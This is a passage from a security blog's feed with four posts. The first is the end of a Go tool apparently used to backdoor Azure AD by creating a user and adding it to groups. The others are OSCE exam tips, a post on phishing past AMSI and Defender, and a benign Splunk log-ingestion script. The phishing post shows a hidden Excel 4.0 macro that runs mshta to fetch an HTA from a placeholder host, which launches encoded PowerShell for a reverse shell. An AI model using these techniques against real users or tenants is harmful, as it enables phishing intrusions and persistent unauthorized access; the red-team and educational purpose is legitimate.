        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Have Auth Tokens For Both Apps...&#34;</span>)
    } <span style="color:#66d9ef">else</span> {
        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Do Not Have Auth Tokens For Both Apps...Something Went Wrong Exiting...&#34;</span>)
        <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
    }
    
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Creating User Via O365 App...&#34;</span>)
    <span style="color:#a6e22e">NewUserResult</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateUser</span>(<span style="color:#a6e22e">O365AuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span>,<span style="color:#a6e22e">TenantId</span>,<span style="color:#a6e22e">DirectoryName</span>[<span style="color:#ae81ff">1</span>],<span style="color:#f92672">*</span><span style="color:#a6e22e">addedUserptr</span>)
    <span style="color:#a6e22e">NewUserObjId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">NewUserResult</span>.<span style="color:#a6e22e">ObjectID</span>
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] Successfully Created The Following User: %s@%s Pass: %s\n&#34;</span>,<span style="color:#f92672">*</span><span style="color:#a6e22e">addedUserptr</span>,<span style="color:#a6e22e">DirectoryName</span>[<span style="color:#ae81ff">1</span>],<span style="color:#a6e22e">pwndpass</span>)
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Using Exchange Online App To Enumerate Groups...&#34;</span>)
    <span style="color:#a6e22e">EnumGrpResult</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">EnumerateGroups</span>(<span style="color:#a6e22e">ExchangeAuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span>,<span style="color:#a6e22e">TenantId</span>)
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">GrpObjMap</span> = make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>)
    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span>  <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>{
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">SecurityEnabled_Grp</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>{
            <span style="color:#a6e22e">GrpObjMap</span>[<span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">DisplayName_Grp</span>] = <span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">ObjectID_Grp</span>
        }
    }
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">GrpObjMap</span>)
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Successfully Enumerated Groups&#34;</span>)

    
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Reconnecting to Azure Management Resource&#34;</span>)
    <span style="color:#a6e22e">AzureManagementAuthStruct</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">authAsSPN</span>(<span style="color:#e6db74">&#34;https://graph.microsoft.com&#34;</span>,<span style="color:#a6e22e">ExchangeAppIdGlobal</span>,<span style="color:#a6e22e">pwndpass</span>,<span style="color:#a6e22e">TenantId</span>)

    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Unfortunately we dont have permissions to check the assigned group roles&#34;</span>)
    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">GrpObjMap</span> {
        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Add user to this group? %s y/n or q to quit\n&#34;</span>,<span style="color:#a6e22e">x</span>)
        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">userchoice2</span> <span style="color:#66d9ef">string</span>    
        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Scanln</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">userchoice2</span>)
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">userchoice2</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;y&#34;</span>{
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Attempting To User To Following Group %s:::%s\n&#34;</span>,<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
            <span style="color:#a6e22e">AddUserToGrp</span>(<span style="color:#a6e22e">AzureManagementAuthStruct</span>.<span style="color:#a6e22e">AccessToken</span>,<span style="color:#a6e22e">TenantId</span>,<span style="color:#a6e22e">NewUserObjId</span>,<span style="color:#a6e22e">y</span>)
        }<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">userchoice2</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;q&#34;</span>{
            <span style="color:#66d9ef">break</span>
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#66d9ef">continue</span>
        }
    }
</code></pre></div><h2 id="well-now-what">Well now what</h2>
<p>The powershell shows up in event viewer.
<img src="/event.png" alt=""></p>
<p>Also heres what it looks like in the azure AD Audit logs</p>
<p><img src="/azaudit.png" alt=""></p>
<p>You can see the Sync account updating the service principals and then those applications creating a user and adding to groups respectively.</p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>During the research for the api i used this app even though i knew it was phishy
<a href="https://graphexplorer.azurewebsites.net/">https://graphexplorer.azurewebsites.net/</a>
And i got my azure test environment hacked&hellip;But it was really cool to see some tactics performed by a real adversary.
He invited himself as a guest and created an azure web app proxy to get access to my on prem test env remotely. May look into this in the future. So if anyone wants to set up a honeypot azure tenant that link is the way to do it as its actively being used to target people.</p>
<h2 id="more-links">More Links</h2>
<ul>
<li><a href="https://www.jetbrains.com/decompiler/">https://www.jetbrains.com/decompiler/</a></li>
<li><a href="https://www.telerik.com/fiddler">https://www.telerik.com/fiddler</a></li>
<li><a href="https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html">https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html</a></li>
<li><a href="https://github.com/dirkjanm/ROADtools">https://github.com/dirkjanm/ROADtools</a></li>
</ul>
<h2 id="why-golang">Why Golang?</h2>
<p>Idk just trying it out. Probably will go back to learning C though.</p>
<h2 id="repo-link">Repo Link</h2>
<p><a href="https://github.com/latortuga71/Learning_GO/tree/master/AzureADBackDoor">https://github.com/latortuga71/Learning_GO/tree/master/AzureADBackDoor</a></p>
<h2 id="poc-video">POC Video</h2>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/GW6CC6ZUVfk" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

]]></content>
        </item>
        
        <item>
            <title>OSCE Exam Tips</title>
            <link>https://christopherja.rocks/posts/2020/04/osce-exam-tips/</link>
            <pubDate>Thu, 02 Apr 2020 08:53:31 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/04/osce-exam-tips/</guid>
            <description>Just finished my OSCE Exam. And i wanted to contribute a quick blog post regarding the exam/course since i used alot of these myself to prepare. Ill start by laying out some key things i think that helped me pass and eleborate on each with some more details. Keep in mind this is meant to be very to the point and will not detail my exam experience such as time i took etc.</description>
            <content type="html"><![CDATA[<p>Just finished my OSCE Exam. And i wanted to contribute a quick blog post regarding the exam/course since i used alot of these myself to prepare. Ill start by laying out some key things i think that helped me pass and eleborate on each with some more details. Keep in mind this is meant to be very to the point and will not detail my exam experience such as time i took etc. (Meant to be a short blog post)</p>
<ul>
<li>SLAE Course</li>
<li>Knowledge of PHP &amp; Web Applications</li>
<li>Practicing on VulnServer</li>
<li>Knowledge of C</li>
<li>Simple Shellcoding On Windows</li>
<li>Using Google For Research</li>
</ul>
<h2 id="slae-course">SLAE Course</h2>
<p><a href="https://www.pentesteracademy.com/course?id=3">I highly suggest taking this course</a> or just signing up to pentester academy in general, by the end of it you will understand x86 assembly pretty well. And will have written shellcode in linux. While using GDB as the debugger. I would go as far as to say this should be a required prerequisite before taking OSCE.</p>
<h2 id="knowledge-of-php--web-applications">Knowledge of PHP &amp; Web Applications</h2>
<p>About 1.5 years ago i was on a helpdesk when learning PHP and people said i was wasting my time lol. I highly suggest creating simple php applications at the very minimum and use the following <a href="https://github.com/paralax/lfi-labs">Github repo</a> to practice some LFI attacks and perhaps trying to obtain RCE from an LFI attack. LFI gets touched on in the course. So you dont need to spend that much time on this but at least be able to read source code and identify vulnerable functions.</p>
<h2 id="practicing-on-vulnserver">Practicing on VulnServer</h2>
<p>This is by far the most helpful thing you can do to pass OSCE stephen bradshaw created a vulnerable server that can be used for exploit development. Do every single function atleast twice and the harder ones 3 times.
<a href="https://github.com/stephenbradshaw/vulnserver">VulnServer</a></p>
<h2 id="knowledge-of-c--python">Knowledge of C &amp; Python</h2>
<p>This helps alot, this should kind of be a prerequisite to SLAE but yeah.</p>
<h2 id="simple-shellcoding-on-windows">Simple Shellcoding on Windows</h2>
<p>Do it. <a href="https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/">Corelan Intro to Shellcoding</a></p>
<h2 id="using-google-for-research">Using Google For Research</h2>
<p>You will be googling alot. Get used to googling your hunches on what the next step or exploit can be.</p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>By the end of the course and while doing vulnserver you should be familiar with SEH stuff, classic overflows and ways to jump around small buffer space as well as SUBENCODE your instructions. The course really expects you to learn on your own before and after the course. I have some links below that you should bookmark while taking the course. Before you take the exam be prepared to think way outside the box and relax.</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=0n3Li63PwnQ">John Hammond OSCE PREP VID</a></li>
<li><a href="http://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/">SubEncoding</a></li>
<li><a href="http://www.gosecure.it/blog/art/452/sec/create-a-custom-shellcode-using-system-function/">Custom ShellCode Example</a></li>
<li><a href="https://defuse.ca/online-x86-assembler.htm">Online x86 / x64 Assembler and Disassembler</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Phishing AMSI Bypass</title>
            <link>https://christopherja.rocks/posts/2020/02/phishing-amsi-bypass/</link>
            <pubDate>Tue, 25 Feb 2020 13:07:25 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/02/phishing-amsi-bypass/</guid>
            <description>How to bypass AMSI (The Simplest Way) I was looking to run my own phishing campaigns on my current organization and was testing office document payloads. I tried the old fashioned VBA in the macro running the shell function as well as some others, and defender caught most if not all of them. Using this tool Macro-Pack works sometimes but often, it would get flagged or the powershell command would not properly run.</description>
            <content type="html"><![CDATA[<h2 id="how-to-bypass-amsi-the-simplest-way">How to bypass AMSI (The Simplest Way)</h2>
<p>I was looking to run my own phishing campaigns on my current organization and was testing office document payloads.
I tried the old fashioned VBA in the macro running the shell function as well as some others, and defender caught most if not all of them.
Using this tool <a href="https://github.com/sevagas/macro_pack">Macro-Pack</a> works sometimes but often, it would get flagged or the powershell command would not properly run.
I noticed that most of the issues i was running into was this AMSI popup <img src="/popup.png" alt="asmi popup"></p>
<p>So i began researching AMSI as i never heard of it. The following resources break down AMSI and bypass options.</p>
<ul>
<li><a href="https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/">Outflank</a></li>
<li><a href="https://medium.com/@byte_St0rm/adventures-in-the-wonderful-world-of-amsi-25d235eb749c">byte storm</a></li>
<li><a href="https://security-soup.net/flawedammyy-rat-excel-4-0-macros/">security soup</a></li>
<li><a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">OutFlank2</a></li>
</ul>
<p>The first two explain what AMSI is and the last two go into the easier ways to bypass it. Security-Soup broke down how some actors bypassed it using excel 4.0 macros.
Aka really old macros that still work. I used the following link to get more familiar with these macros.<a href="https://exceloffthegrid.com/using-excel-4-macro-functions/">Excel Off The Grid</a>.
I pretty much right clicked my sheet. And clicked Excel 4.0 macro. This creates a new sheet called macro1. If you rename the first cell Auto_open it will run the sheet cell by cell. Dont forget to hide the sheet after this lol. You can run pretty much anything with the following function.</p>
<pre><code>=EXEC(&quot;cmd.exe&quot;)
</code></pre><p>The issue i was running into at this point was not AMSI it was defender flagging certain lolbins like certil for example.
So i decide to look for lolbins that could potentially bypass defender since AMSI was taken care of. I came across a post here on <a href="https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/">IronHackers</a>
That pretty much goes through alot of lolbins but what i noticed was they mentioned that. Mshta.exe doesnt get flagged.</p>
<p>So i found an HTA payload which contained some jscript and tried injecting that into my exec function. The macro1 sheet now looks like this</p>
<pre><code>=EXEC(&quot;mshta.exe http://someip/evil.hta&quot;)
</code></pre><p>The HTA file looks like this</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;HTA:APPLICATION id=&quot;hwHTA&quot;
applicationName=&quot;hyperHTA&quot;
border=&quot;thin&quot;
borderStyle=&quot;normal&quot;
caption=&quot;yes&quot;
icon=&quot;http://www.hyperwrite.com/features/favicon.ico&quot;
maximizeButton=&quot;yes&quot;
minimizeButton=&quot;yes&quot;
showInTaskbar=&quot;no&quot;
windowState=&quot;normal&quot;
innerBorder=&quot;yes&quot;
navigable=&quot;yes&quot;
scroll=&quot;auto&quot;
scrollFlat=&quot;yes&quot;
singleInstance=&quot;yes&quot; 
sysMenu=&quot;yes&quot;
contextMenu=&quot;yes&quot;
selection=&quot;yes&quot; 
version=&quot;1.0&quot; /&gt;

&lt;script&gt;
a=new ActiveXObject(&quot;WScript.Shell&quot;);
a.run(&quot;powershell -encodedCommand safdjngnrwgnwfn Blah blah blah&quot;,0,false);window.close();
&lt;/script&gt;

&lt;title&gt;Simple HTML Page&lt;/title&gt;

&lt;/head&gt;

&lt;body&gt;

&lt;h1&gt;Dummy Page&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;This is a simple, common or garden variety, normal HTML page. Oh, but saved
with a .HTA extension, and with an &amp;lt;HTA&amp;gt; application block included at the
top of the HTML code. &lt;/p&gt;
&lt;p&gt;And to make it interesting, here is a link to the &lt;a href=&quot;http://www.aodc.com.au/&quot; target=&quot;_top&quot;&gt;AODC
Web site&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;And why not retrieve the version number out of the HTA:Application properties
using &lt;a href=&quot;#&quot; onClick=&quot;JavaScript:alert('Version of this HTA is ' + hwHTA.version)&quot;&gt;JavaScript&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>Im not very savy to Jscript or VB so i found this online entered my own powershell encoded command into it.
And to my surprise it did not trigger defender and my reverse shell came in soon after. So with just using an old school method found with soome googling and leveraging mshta.exe you too can bypass defender as well as AMSI to get code execution.</p>
<h2 id="how-to-bypass-amsi-the-harder-way">How to bypass AMSI (The Harder Way)</h2>
<h3 id="but-its-more-flexible-and-in-depth">but its more flexible and in depth</h3>
<p>===&gt; <a href="https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9">Hoang Bui&rsquo;s Blog</a></p>
<h2 id="coming-soon">Coming soon</h2>
<h3 id="macos-phishing-tactics">MacOS phishing tactics</h3>
]]></content>
        </item>
        
        <item>
            <title>Splunk-G-Suite-Python-App</title>
            <link>https://christopherja.rocks/posts/2020/02/splunk-g-suite-python-app/</link>
            <pubDate>Sun, 02 Feb 2020 13:05:45 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/02/splunk-g-suite-python-app/</guid>
            <description>Ingesting G Suite Alert Center Logs Into Splunk I was recently tasked with ingesting alot of data from various cloud platforms like AWS &amp;amp; GCP into splunk. Splunk provides very good documentation and provides add-ons for both of these platforms. However for G-Suite (which is like 0365 but for google) There seems to be one app that is used and actually works very well. G Suite App Kyle Smith wrote it.</description>
            <content type="html"><![CDATA[<h2 id="ingesting-g-suite-alert-center-logs-into-splunk">Ingesting G Suite Alert Center Logs Into Splunk</h2>
<p>I was recently tasked with ingesting alot of data from various cloud platforms like AWS &amp; GCP into splunk.
Splunk provides very good documentation and provides add-ons for both of these platforms. However for G-Suite (which is like 0365 but for google) There seems to be one app that is used and actually works very well. <a href="https://splunkbase.splunk.com/app/3791/#/details">G Suite App</a> <a href="https://splunkbase.splunk.com/apps/#/author/alacercogitatus">Kyle Smith wrote it</a>.</p>
<p>It has logging options for most apps in G Suite. (you can literally see every log from drive) After setting it up i realized that i really didnt need to see all that stuff and instead opted to look for an option regarding the <a href="https://support.google.com/a/answer/9105393?hl=en&amp;ref_topic=9105077">G Suite Alert Center</a></p>
<p>At this point i was happy with the alerts triggered. Since it will alert on DLP rules as well as sus logins or sus emails.
Also you can create custom alerts based on rules set up <a href="https://support.google.com/analytics/answer/1033021?hl=en">using that investigation center gui</a>. It gives you options to create different rules based on the logs its constantly looking at if that makes sense. Unfortunately at the time and still (i think) the g suite app doesnt support the alert center logs. So i sought out a way to ingest those using the Splunk HEC.</p>
<p>Searching online i couldnt find much in this topic/issue. So i contacted google and asked about this <a href="https://developers.google.com/admin-sdk/alertcenter/guides">article</a>.
The quickstart guide is in java. I asked if they had any way to do this in python or another language. The support rep told me there was NO way to do this in another language&hellip;Ok.</p>
<p>Searching google i was able to find a <a href="https://developers.google.com/resources/api-libraries/documentation/alertcenter/v1beta1/python/latest/alertcenter_v1beta1.alerts.html">reference</a> to the api. So i started writing something to query it for latest alerts.
the hardest part was finding the syntax for the initial build function that is provided by the google library. I found a post that had the correct syntax and i was finally able to query it <a href="https://github.com/googleapis/google-api-python-client/issues/777">here</a>.
Before this obviously you need to set up the proper credentials the article for those steps are <a href="https://developers.google.com/identity/protocols/oauth2/service-account">here</a> Specifically the &ldquo;Delegating domain-wide authority to the service account&rdquo; section.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">scopes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/apps.alerts&#34;</span>]
SERVICE_ACCOUNT_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;json creds&#39;</span>
credentials <span style="color:#f92672">=</span> service_account<span style="color:#f92672">.</span>Credentials<span style="color:#f92672">.</span>from_service_account_file(SERVICE_ACCOUNT_FILE, subject<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;acount here&#34;</span>, scopes<span style="color:#f92672">=</span>scopes)
service <span style="color:#f92672">=</span> build(<span style="color:#e6db74">&#39;alertcenter&#39;</span>, <span style="color:#e6db74">&#39;v1beta1&#39;</span>, credentials<span style="color:#f92672">=</span>credentials)<span style="color:#f92672">.</span>alerts()

</code></pre></div><p>After getting the initial auth squared away, i was able to focus on getting the queries i wanted. I decided i would loop it to check every minute for a new alert in the past minute this <a href="https://developers.google.com/admin-sdk/alertcenter/reference/filter-fields.html">page</a> helped with the queries needed to filter alerts. Once the timestamp and query format was correct i just practiced with the sending of the data to slunk wich is a straight forward post request. I added this to a linux server as a service with SystemD
And it hasnt failed me yet or missed an alert.</p>
<p>Here is the end result once in splunk.</p>
<p><img src="/gsuite.png" alt="asmi popup"></p>
<p>This could probably be added to the current G Suite App or made even better. But this was my way to work through the problem.
<a href="https://github.com/latortuga71/GSuiteAlerts2Splunk">The Repo</a></p>
<p>The Code Below</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
<span style="color:#f92672">from</span> googleapiclient.discovery <span style="color:#f92672">import</span> build
<span style="color:#f92672">from</span> google_auth_oauthlib.flow <span style="color:#f92672">import</span> InstalledAppFlow
<span style="color:#f92672">from</span> google.auth.transport.requests <span style="color:#f92672">import</span> Request
<span style="color:#f92672">from</span> google.oauth2 <span style="color:#f92672">import</span> service_account
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> datetime
<span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> exit
<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
<span style="color:#f92672">import</span> logging

logging<span style="color:#f92672">.</span>basicConfig(filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/opt/gsuite-alerts.log&#39;</span>,level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>INFO)

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">	    scopes = [&#34;https://www.googleapis.com/auth/apps.alerts&#34;]
</span><span style="color:#e6db74">	    SERVICE_ACCOUNT_FILE = &#39;json creds&#39;
</span><span style="color:#e6db74">	    credentials = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, subject=&#34;acount here&#34;, scopes=scopes)
</span><span style="color:#e6db74">	    service = build(&#39;alertcenter&#39;, &#39;v1beta1&#39;, credentials=credentials).alerts()
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>

<span style="color:#75715e">#recent_alerts = service.list().execute().get(&#34;alerts&#34;, [])</span>
<span style="color:#75715e">#https://developers.google.com/resources/api-libraries/documentation/alertcenter/v1beta1/python/latest/alertcenter_v1beta1.alerts.html#list</span>
<span style="color:#75715e">#https://developers.google.com/admin-sdk/alertcenter/reference/filter-fields.html</span>
<span style="color:#75715e">#https://github.com/googleapis/google-api-python-client/issues/777</span>
<span style="color:#75715e">#filter = &#34;createTime &gt;= \&#34;2018-04-05T00:00:00Z\&#34;&#34;</span>
<span style="color:#75715e"># FILTER NEEDS TO BE IN STRING FORMAT THE WHOLE THING ESCAPE DOUBLE QUOTES</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AlertAPI</span>(object):
	alert_id <span style="color:#f92672">=</span> None
	scopes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/apps.alerts&#34;</span>]
	SERVICE_ACCOUNT_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;appcreds.json&#39;</span>
	credentials <span style="color:#f92672">=</span> service_account<span style="color:#f92672">.</span>Credentials<span style="color:#f92672">.</span>from_service_account_file(SERVICE_ACCOUNT_FILE, subject<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;account here&#34;</span>, scopes<span style="color:#f92672">=</span>scopes)
	<span style="color:#75715e">#service = build(&#39;alertcenter&#39;, &#39;v1beta1&#39;, credentials=credentials).alerts()</span>



	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_new_alerts</span>(self):
		self<span style="color:#f92672">.</span>service <span style="color:#f92672">=</span> build(<span style="color:#e6db74">&#39;alertcenter&#39;</span>, <span style="color:#e6db74">&#39;v1beta1&#39;</span>, credentials<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>credentials)<span style="color:#f92672">.</span>alerts()
		self<span style="color:#f92672">.</span>one_min_behind <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>utcnow() <span style="color:#f92672">-</span> datetime<span style="color:#f92672">.</span>timedelta(minutes<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
		self<span style="color:#f92672">.</span>now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>utcnow()
		self<span style="color:#f92672">.</span>time_filter_str1 <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>one_min_behind<span style="color:#f92672">.</span>isoformat()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Z&#34;</span>
		self<span style="color:#f92672">.</span>time_filter_str2 <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>now<span style="color:#f92672">.</span>isoformat()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Z&#34;</span>
		self<span style="color:#f92672">.</span>final_filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;createTime &gt;= </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> AND createTime &lt; </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>time_filter_str1,self<span style="color:#f92672">.</span>time_filter_str2)
		logging<span style="color:#f92672">.</span>info(self<span style="color:#f92672">.</span>final_filter)
		orderfilter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;create_time asc&#34;</span>
		self<span style="color:#f92672">.</span>recent_alerts <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>service<span style="color:#f92672">.</span>list(orderBy<span style="color:#f92672">=</span>orderfilter,filter<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>final_filter)<span style="color:#f92672">.</span>execute() <span style="color:#75715e">#pageSize=2 filter=self.final_filter OR type=\&#34;*\&#34;</span>
		<span style="color:#75715e">#print(self.recent_alerts)</span>
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>recent_alerts:
			<span style="color:#75715e"># write this to a log file eventually</span>
			<span style="color:#75715e">#print(self.recent_alerts)</span>
			self<span style="color:#f92672">.</span>num_of_alerts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
		<span style="color:#66d9ef">else</span>:
			self<span style="color:#f92672">.</span>num_of_alerts <span style="color:#f92672">=</span> len(self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>])
			logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Alerts found =&gt; {}&#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>num_of_alerts))
			logging<span style="color:#f92672">.</span>info(self<span style="color:#f92672">.</span>recent_alerts)



	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post_to_splunk</span>(self,payload):
		self<span style="color:#f92672">.</span>ready2post <span style="color:#f92672">=</span> {}
		self<span style="color:#f92672">.</span>ready2post[<span style="color:#e6db74">&#39;sourcetype&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gsuite_alerts_api&#34;</span>
		self<span style="color:#f92672">.</span>ready2post[<span style="color:#e6db74">&#39;event&#39;</span>] <span style="color:#f92672">=</span> payload
		self<span style="color:#f92672">.</span>finalpayload <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(self<span style="color:#f92672">.</span>ready2post,indent<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)
		self<span style="color:#f92672">.</span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Authorization&#34;</span>:<span style="color:#e6db74">&#34;Splunk tokenhere &#34;</span>,
						<span style="color:#e6db74">&#34;Content-type&#34;</span>:<span style="color:#e6db74">&#34;application/json&#34;</span>}
		resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;splunk hec url&#34;</span>,headers<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>headers,data<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>finalpayload)
		logging<span style="color:#f92672">.</span>info(resp)
		logging<span style="color:#f92672">.</span>info(resp<span style="color:#f92672">.</span>text)
		resp_dict <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(resp<span style="color:#f92672">.</span>text)
		<span style="color:#66d9ef">if</span> resp_dict[<span style="color:#e6db74">&#39;text&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;Success&#34;</span>:
			logging<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Failed Posting to splunk&#34;</span>)
		<span style="color:#66d9ef">else</span>:
			logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Successfully Posted to splunk&#34;</span>)




	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(self):
		<span style="color:#66d9ef">while</span> True:
		    <span style="color:#75715e">#self.check_new_alerts()</span>
		    <span style="color:#66d9ef">try</span>:
		    	self<span style="color:#f92672">.</span>check_new_alerts()
		    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
		    	logging<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;ERROR {}&#34;</span><span style="color:#f92672">.</span>format(e))
		    	sleep(<span style="color:#ae81ff">60</span>)
		    	<span style="color:#66d9ef">continue</span>

